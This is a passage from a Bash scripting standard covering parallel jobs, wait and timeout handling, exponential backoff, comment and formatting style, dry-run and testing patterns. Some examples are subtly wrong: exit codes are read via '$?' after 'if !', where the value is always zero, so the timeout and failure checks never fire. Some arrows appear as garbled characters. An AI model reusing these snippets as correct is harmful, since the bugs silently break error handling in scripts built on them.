**See Also:** BCS1102 (Parallel Execution), BCS1103 (Wait Patterns), BCS1104 (Timeout Handling)


---


**Rule: BCS1102**

## Parallel Execution Patterns

**Rule: BCS1102**

Executing multiple commands concurrently while maintaining control and collecting results.

---

#### Rationale

- Significant speedup for I/O-bound tasks
- Better resource utilization
- Efficient batch processing

---

#### Basic Parallel Pattern

```bash
declare -a pids=()

# Start jobs in parallel
for server in "${servers[@]}"; do
  run_command "$server" "$@" &
  pids+=($!)
done

# Wait for all to complete
for pid in "${pids[@]}"; do
  wait "$pid" || true
done
```

#### Parallel with Output Capture

```bash
declare -- temp_dir
temp_dir=$(mktemp -d)
trap 'rm -rf "$temp_dir"' EXIT

declare -a pids=()

for server in "${servers[@]}"; do
  {
    result=$(run_command "$server" 2>&1)
    echo "$result" > "$temp_dir/$server.out"
  } &
  pids+=($!)
done

# Wait then display in order
for pid in "${pids[@]}"; do
  wait "$pid" || true
done

# Output results in original order
for server in "${servers[@]}"; do
  [[ -f "$temp_dir"/"$server".out ]] && cat "$temp_dir"/"$server".out
done
```

#### Parallel with Concurrency Limit

```bash
declare -i max_jobs=4
declare -a pids=()

local -a active=()
for task in "${tasks[@]}"; do
  # Wait if at max concurrency
  while ((${#pids[@]} >= max_jobs)); do
    wait -n 2>/dev/null || true
    # Remove completed PIDs
    active=()
    for pid in "${pids[@]}"; do
      kill -0 "$pid" 2>/dev/null && active+=("$pid")
    done
    pids=("${active[@]}")
  done

  process_task "$task" &
  pids+=($!)
done

# Wait for remaining
wait
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - variable lost in subshell
count=0
for task in "${tasks[@]}"; do
  { process "$task"; count+=1; } &
done
wait
echo "$count"  # Always 0!

# ✓ Correct - use temp files for results
for task in "${tasks[@]}"; do
  { process "$task" && echo 1 >> "$temp_dir"/count; } &
done
wait
count=$(wc -l < "$temp_dir"/count)
```

---

**See Also:** BCS1101 (Background Jobs), BCS1103 (Wait Patterns)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` lines 465-530


---


**Rule: BCS1103**

## Wait Patterns

**Rule: BCS1103**

Proper synchronization when waiting for background processes.

---

#### Rationale

- All resources cleaned up, exit codes captured correctly
- Scripts don't hang on failed processes; graceful interrupt handling

---

#### Basic Wait

```bash
# Wait for specific PID and capture exit code
command &
pid=$!
wait "$pid"
exit_code=$?
```

#### Wait for All Jobs

```bash
# Wait for all background jobs
wait

# With error tracking
declare -i errors=0
for pid in "${pids[@]}"; do
  wait "$pid" || errors+=1
done
((errors)) && warn "$errors jobs failed" ||:
```

#### Wait for Any (Bash 4.3+)

```bash
# Wait for first job to complete
declare -a pids=()
for task in "${tasks[@]}"; do
  process_task "$task" &
  pids+=($!)
done

# Process as they complete
local -a active=()
while ((${#pids[@]} > 0)); do
  wait -n
  exit_code=$?
  # Handle completion...

  # Update active PIDs list
  active=()
  for pid in "${pids[@]}"; do
    kill -0 "$pid" 2>/dev/null && active+=("$pid")
  done
  pids=("${active[@]}")
done
```

#### Wait with Error Collection

```bash
declare -A exit_codes=()

for server in "${servers[@]}"; do
  run_command "$server" &
  exit_codes[$server]=$!
done

declare -i failures=0
for server in "${!exit_codes[@]}"; do
  pid=${exit_codes[$server]}
  if ! wait "$pid"; then
    exit_codes[$server]=$?
    failures+=1
  else
    exit_codes[$server]=0
  fi
done

((failures)) && error "$failures servers failed"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - ignoring wait return value
command &
wait $!  # Exit code lost

# ✓ Correct - capture and use exit code
command &
wait $! || die 1 'Command failed'
```

---

**See Also:** BCS1101 (Background Jobs), BCS1102 (Parallel Execution)


---


**Rule: BCS1104**

## Timeout Handling

**Rule: BCS1104**

Managing command timeouts and handling timeout conditions gracefully.

---

#### Rationale

Timeout handling prevents scripts hanging on unresponsive commands, resource exhaustion from stuck processes, poor UX with indefinite waits, and cascading failures in automated systems.

---

#### Basic Timeout

```bash
# Simple timeout (coreutils)
if timeout 30 long_running_command; then
  success 'Command completed'
else
  exit_code=$?
  if ((exit_code == 124)); then
    warn 'Command timed out'
  else
    error "Command failed with exit code $exit_code"
  fi
fi
```

#### Timeout with Signal Selection

```bash
# Send SIGTERM first, SIGKILL after grace period
timeout --signal=TERM --kill-after=10 60 command

# Common timeout exit codes:
# 124 - command timed out
# 125 - timeout command itself failed
# 126 - command found but not executable
# 127 - command not found
# 137 - killed by SIGKILL (128 + 9)
```

#### Timeout with Variable Duration

```bash
declare -i TIMEOUT=${TIMEOUT:-30}

run_with_timeout() {
  local -i timeout_sec=$1; shift

  if ! timeout "${timeout_sec}s" "$@"; then
    local -i exit_code=$?
    case $exit_code in
      124) warn "Timed out after ${timeout_sec}s" ;;
      125) error 'Timeout command failed' ;;
      *)   error "Failed with exit code $exit_code" ;;
    esac
    return "$exit_code"
  fi
}

run_with_timeout "$TIMEOUT" ssh "$server" "$command"
```

#### Read with Timeout

```bash
# User input with timeout
if read -r -t 10 -p 'Enter value: ' value; then
  info "Got: $value"
else
  warn 'Input timed out, using default'
  value='default'
fi
```

#### Connection Timeout Pattern

```bash
# SSH with connection timeout
ssh -o ConnectTimeout=10 -o BatchMode=yes "$server" "$command"

# curl with timeout
curl --connect-timeout 10 --max-time 60 "$url"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - no timeout on network operations
ssh "$server" 'long_command'  # May hang forever

# ✓ Correct - always timeout network operations
timeout 300 ssh -o ConnectTimeout=10 "$server" 'long_command'
```

---

**See Also:** BCS1105 (Exponential Backoff)

**Full implementation:** See `examples/exemplar-code/oknav/oknav` line 676


---


**Rule: BCS1105**

## Exponential Backoff

**Rule: BCS1105**

Retry logic with exponential delay for transient failures.

---

#### Rationale

- Graceful transient failure handling with automatic recovery
- Reduces load on failing services via configurable retry behavior

---

#### Basic Exponential Backoff

```bash
retry_with_backoff() {
  local -i max_attempts=${1:-5}
  local -i attempt=1
  shift

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    local -i delay=$((2 ** attempt))
    warn "Attempt $attempt failed, retrying in ${delay}s..."
    sleep "$delay"
    attempt+=1
  done

  error "Failed after $max_attempts attempts"
  return 1
}

retry_with_backoff 5 curl -f "$url"
```

#### With Maximum Delay Cap

```bash
retry_with_backoff() {
  local -i max_attempts=5
  local -i max_delay=60
  local -i attempt=1
  local -i delay

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    delay=$((2 ** attempt))
    ((delay > max_delay)) && delay=$max_delay ||:

    ((VERBOSE)) && info "Retry $attempt in ${delay}s..." ||:
    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### With Jitter (Randomization)

```bash
# Add randomization to prevent thundering herd
retry_with_jitter() {
  local -i max_attempts=5
  local -i attempt=1

  local -i base_delay jitter delay

  while ((attempt <= max_attempts)); do
    if "$@"; then
      return 0
    fi

    base_delay=$((2 ** attempt))
    jitter=$((RANDOM % base_delay))
    delay=$((base_delay + jitter))

    sleep "$delay"
    attempt+=1
  done

  return 1
}
```

#### Claude AI Retry Pattern

```bash
local -i attempt=1 max_attempts=3

while ((attempt <= max_attempts)); do
  if claude --print ... > "$temp_file" 2>&1; then
    if [[ -s "$temp_file" ]]; then
      # Success - non-empty output
      break
    fi
    warn 'Empty response, retrying...'
  fi

  sleep $((2 ** attempt))
  attempt+=1
done

((attempt > max_attempts)) && die 1 'Max retries exceeded' ||:
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - fixed delay floods service
while ! command; do
  sleep 5  # Same delay every time
done

# ✓ Correct - exponential backoff
declare -i attempt=1
while ! command; do
  sleep $((2 ** attempt))
  attempt+=1
  ((attempt > 5)) && break ||:
done
```

---

**See Also:** BCS1104 (Timeout Handling), BCS1101 (Background Jobs)


---


**Rule: BCS1200**

# Style & Development

Code formatting, documentation practices, and development patterns for maintainable Bash scripts.

**10 Rules:**

1. **Code Formatting** (BCS1201) - Indentation, line length, structure
2. **Comments** (BCS1202) - Comment style and placement
3. **Blank Lines** (BCS1203) - Whitespace for readability
4. **Section Markers** (BCS1204) - Visual section delimiters
5. **Language Practices** (BCS1205) - Bash-specific idioms
6. **Development Practices** (BCS1206) - Version control, testing habits
7. **Debugging** (BCS1207) - Debug output and tracing
8. **Dry-Run Mode** (BCS1208) - Safe preview of destructive operations
9. **Testing** (BCS1209) - Test structure and assertions
10. **Progressive State** (BCS1210) - Multi-stage operation tracking

**Key principle:** Consistent formatting and documentation make scripts maintainable by both humans and AI assistants.


---


**Rule: BCS1201**

## Code Formatting

#### Indentation
- !! Use 2 spaces for indentation (NOT tabs)
- Maintain consistent indentation throughout

#### Line Length
- Keep lines under 100 characters when practical
- Long file paths and URLs can exceed 100 chars when necessary
- Use line continuation with `\` for long commands


---


**Rule: BCS1202**

## Comments

Focus on **WHY** (rationale, business logic, non-obvious decisions) not **WHAT** (code already shows):

```bash
# Section separator (80 dashes)
# --------------------------------------------------------------------------------

# ✓ Good - explains WHY (rationale and special cases)
# PROFILE_DIR intentionally hardcoded to /etc/profile.d for system-wide bash profile
# integration, regardless of PREFIX. This ensures builtins are available in all
# user sessions. To override, modify this line or use a custom install method.
declare -- PROFILE_DIR=/etc/profile.d

((max_depth > 0)) || max_depth=255  # -1 means unlimited (WHY -1 is special)

# ✗ Bad - restates WHAT the code already shows
# Set PROFILE_DIR to /etc/profile.d
declare -- PROFILE_DIR=/etc/profile.d
```

**Good comments:** Non-obvious business rules, intentional pattern deviations, complex logic rationale, chosen approach justification, subtle gotchas/side effects.

**Avoid commenting:** Simple assignments, obvious conditionals, standard patterns, self-explanatory code.

**Documentation icons:** ◉ info | ⦿ debug | ▲ warn | ✓ success | ✗ error


---


**Rule: BCS1203**

## Blank Line Usage

Use blank lines strategically for visual separation between logical blocks:

```bash
#!/bin/bash
set -euo pipefail

# Script metadata
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
                                          # ← Blank line after metadata group

# Default values                          # ← Blank line before section comment
declare -- PREFIX=/usr/local
declare -i DRY_RUN=0
                                          # ← Blank line after variable group

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
                                          # ← Blank line before function
check_prerequisites() {
  info 'Checking prerequisites...'

  # Check for gcc                         # ← Blank line after info call
  if ! command -v gcc &> /dev/null; then
    die 1 "'gcc' compiler not found."
  fi

  success 'Prerequisites check passed'    # ← Blank line between checks
}
                                          # ← Blank line between functions
main() {
  check_prerequisites
  install_files
}

main "$@"
#fin
```

**Guidelines:**
- One blank line between functions
- One blank line between logical sections within functions
- One blank line after section comments and between variable groups
- Blank lines before/after multi-line conditional or loop blocks
- Avoid multiple consecutive blank lines; no blank line needed between short, related statements


---


**Rule: BCS1204**

## Section Comments

Use lightweight `# Description` comments to organize code into logical groups.

```bash
# Default values
declare -- PREFIX=/usr/local
declare -i VERBOSE=1
declare -i DRY_RUN=0

# Derived paths
declare -- BIN_DIR="$PREFIX"/bin
declare -- LIB_DIR="$PREFIX"/lib
declare -- DOC_DIR="$PREFIX"/share/doc

# Core message function
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  # ...
}

# Conditional messaging functions
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Unconditional messaging functions
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Guidelines:**
- Keep section comments short (2-4 words), no dashes or box drawing
- Place immediately before the group; blank line after the group
- Reserve 80-dash separators for major script divisions only

**Common patterns:** `# Default values`, `# Derived paths`, `# Core message function`, `# Helper functions`, `# Business logic`, `# Validation functions`


---


**Rule: BCS1205**

## Language Best Practices

### Command Substitution
Always use `$()` instead of backticks.

```bash
# ✓ Correct - modern syntax
var=$(command)

# ✗ Wrong - deprecated syntax
var=`command`
```

**Rationale:** `$()` is clearer, nests naturally without escaping, has better editor support.

**Nesting example:**
```bash
# ✓ Easy to read with $()
outer=$(echo "inner: $(date +%T)")

# ✗ Confusing with backticks (requires escaping)
outer=`echo "inner: \`date +%T\`"`
```

### Builtin Commands vs External Commands
Prefer shell builtins over external commands for performance (10-100x faster) and reliability.

```bash
# ✓ Good - bash builtins
addition=$((x + y))
string=${var^^}  # uppercase
string=${var,,}  # lowercase
if [[ -f "$file" ]]; then

# ✗ Avoid - external commands
addition=$(expr "$x" + "$y")
string=$(echo "$var" | tr '[:lower:]' '[:upper:]')
if [ -f "$file" ]; then
```

**Common replacements:**

| External Command | Builtin Alternative | Example |
|-----------------|---------------------|---------|
| `expr` | `$(())` | `$((x + y))` instead of `$(expr $x + $y)` |
| `basename` | `${var##*/}` | `${path##*/}` instead of `$(basename "$path")` |
| `dirname` | `${var%/*}` | `${path%/*}` instead of `$(dirname "$path")` |
| `tr` (case) | `${var^^}` or `${var,,}` | `${str,,}` instead of `$(echo "$str" \| tr A-Z a-z)` |
| `test`/`[` | `[[` | `[[ -f "$file" ]]` instead of `[ -f "$file" ]` |
| `seq` | `{1..10}` or `for ((i=1; i<=10; i+=1))` | Much faster for loops |

**When external commands are necessary:**
```bash
# Some operations have no builtin equivalent
checksum=$(sha256sum "$file")
current_user=$(whoami)
sorted_data=$(sort "$file")
```


---


**Rule: BCS1206**

## Development Practices

#### ShellCheck Compliance
ShellCheck is **compulsory**. Document exceptions with `#shellcheck disable=...` and reason:

```bash
#shellcheck disable=SC2046  # Intentional word splitting for flag expansion
set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"

shellcheck -x myscript.sh
```

#### Script Termination
```bash
main "$@"
#fin
```

#### Defensive Programming
```bash
: "${VERBOSE:=0}"
: "${DEBUG:=0}"
[[ -n "$1" ]] || die 1 'Argument required'
set -u
```

#### Performance Considerations
Minimize subshells; prefer built-in string operations; batch operations; use process substitution over temp files.

#### Testing Support
Make functions testable with dependency injection, verbose/debug modes, and meaningful exit codes.


---


**Rule: BCS1207**

## Debugging and Development

Enable debugging features for development and troubleshooting.

```bash
# Debug mode implementation
declare -i DEBUG=${DEBUG:-0}

# Enable trace mode when DEBUG is set
((DEBUG)) && set -x ||:

# Enhanced PS4 for better trace output
export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '

# Conditional debug output function
debug() {
  ((DEBUG)) || return 0
  >&2 _msg "$@"
}

# Usage
DEBUG=1 ./script.sh  # Run with debug output
```


---


**Rule: BCS1208**

## Dry-Run Pattern

Implement preview mode for state-modifying operations.

```bash
declare -i DRY_RUN=0

# Parse from command-line
-n|--dry-run) DRY_RUN=1 ;;
-N|--not-dry-run) DRY_RUN=0 ;;

# Pattern: Check flag, show preview, return early
build_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would build standalone binaries'
    return 0
  fi
  make standalone || die 1 'Build failed'
}

install_standalone() {
  if ((DRY_RUN)); then
    info '[DRY-RUN] Would install:' \
         "  $BIN_DIR/mailheader" \
         "  $BIN_DIR/mailmessage"
    return 0
  fi
  install -m 755 build/bin/mailheader "$BIN_DIR"/
  install -m 755 build/bin/mailmessage "$BIN_DIR"/
}
```

**Pattern:** Check `((DRY_RUN))` at function start �' display `[DRY-RUN]` prefixed preview via `info` �' return 0 early �' real operations only when disabled.

**Benefits:** Safe preview of destructive operations; verify paths/files/commands before execution; identical control flow in both modes separates decision logic from action.


---


**Rule: BCS1209**

## Testing Support Patterns

Patterns for testable scripts: dependency injection, test modes, assertions.

```bash
# Dependency injection for testing
declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
declare -f CURL_CMD >/dev/null || CURL_CMD() { curl "$@"; }

# In production
find_files() {
  FIND_CMD "$@"
}

# In tests, override:
FIND_CMD() { echo 'mocked_file1.txt mocked_file2.txt'; }

# Test mode flag
declare -i TEST_MODE="${TEST_MODE:-0}"

# Conditional behavior for testing
if ((TEST_MODE)); then
  DATA_DIR=./test_data
  RM_CMD() { echo "TEST: Would remove $*"; }
else
  DATA_DIR=/var/lib/app
  RM_CMD() { rm "$@"; }
fi

# Assert function for tests
assert() {
  local -- expected=$1
  local -- actual=$2
  local -- message=${3:-Assertion failed}

  if [[ "$expected" != "$actual" ]]; then
    >&2 echo "ASSERT FAIL: $message"
    >&2 echo "  Expected: '$expected'"
    >&2 echo "  Actual:   '$actual'"
    return 1
  fi
  return 0
}

# Test runner pattern
run_tests() {
  local -i passed=0 failed=0
  local -- test_func

  for test_func in $(declare -F | awk '$3 ~ /^test_/ {print $3}'); do
    if "$test_func"; then
      passed+=1
      echo "✓ $test_func"
    else
      failed+=1
      echo "✗ $test_func"
    fi
  done

  echo "Tests: $passed passed, $failed failed"
  ((failed == 0))
}
```

**Key Patterns:**
- **Dependency injection**: Wrap external commands in functions; override in tests
- **Test mode flag**: `declare -i TEST_MODE` controls destructive operations
- **Assertions**: Compare expected vs actual with clear failure messages
- **Test discovery**: Find `test_*` functions via `declare -F`


---


**Rule: BCS1210**

## Progressive State Management

Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.

```bash
# Initial flag declarations
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0

# Parse command-line arguments
main() {
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
    esac
    shift
  done

  # Progressive state management: adjust flags based on runtime conditions

  # If user explicitly requested to skip, disable installation
  if ((SKIP_BUILTIN)); then
    INSTALL_BUILTIN=0
  fi

  # Check if prerequisites are met, adjust flags accordingly
  if ! check_builtin_support; then
    # If user explicitly requested builtins, try to install dependencies
    if ((BUILTIN_REQUESTED)); then
      warn 'bash-builtins package not found, attempting to install...'
      install_bash_builtins || {
        error 'Failed to install bash-builtins package'
        INSTALL_BUILTIN=0  # Disable builtin installation
      }
    else
      # User didn't explicitly request, just skip
      info 'bash-builtins not found, skipping builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Build phase: disable on failure
  if ((INSTALL_BUILTIN)); then
    if ! build_builtin; then
      error 'Builtin build failed, disabling builtin installation'
      INSTALL_BUILTIN=0
    fi
  fi

  # Execution phase: actions based on final flag state
  install_standalone
  ((INSTALL_BUILTIN)) && install_builtin ||: # Only runs if still enabled

  show_completion_message
}
```

**Pattern structure:**
1. Declare all boolean flags at top with initial values
2. Parse arguments, setting flags based on user input
3. Progressively adjust flags based on runtime conditions (dependency checks, build failures, user preferences)
4. Execute actions based on final flag state

**Benefits:**
- Clean separation between decision logic and action
- Traceable flag changes throughout execution
- Fail-safe behavior (disable features when prerequisites fail)
- User intent preserved (`BUILTIN_REQUESTED` tracks original request)
- Idempotent (same input �' same state �' same output)

**Guidelines:**
- Group related flags (`INSTALL_*`, `SKIP_*`)
- Use separate flags for user intent vs. runtime state
- Document state transitions with comments
- Apply state changes in order: parse �' validate �' execute
- Never modify flags during execution phase

**Rationale:** Scripts adapt to runtime conditions while maintaining clarity about decisions. Useful for installation scripts where features may need disabling based on system capabilities or build failures.
#fin
